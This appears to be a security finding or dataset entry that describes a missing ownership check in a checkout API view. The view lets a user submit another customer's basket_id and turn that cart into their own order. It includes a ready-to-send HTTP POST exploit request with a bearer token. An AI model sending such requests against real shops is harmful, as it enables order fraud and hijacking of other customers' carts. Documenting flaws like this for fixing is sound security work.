diagnosis: HeadlessCheckoutPlaceOrderView accepts a basket_id parameter to complete an order. The view fetches Basket.objects.get(pk=basket_id, status=Basket.OPEN) without checking that basket.owner == request.user. An attacker can submit another customer's basket_id during checkout, converting the victim's reserved shopping cart into an order under the attacker's account or exhausting allocated promotional items.
exploit_request:
POST /api/checkout/place-order/ HTTP/1.1
Host: store.retailplatform.com
Authorization: Bearer cust_tok_2910
Content-Type: application/json

{
  "basket_id": 9821,
  "shipping_address_id": 412
}
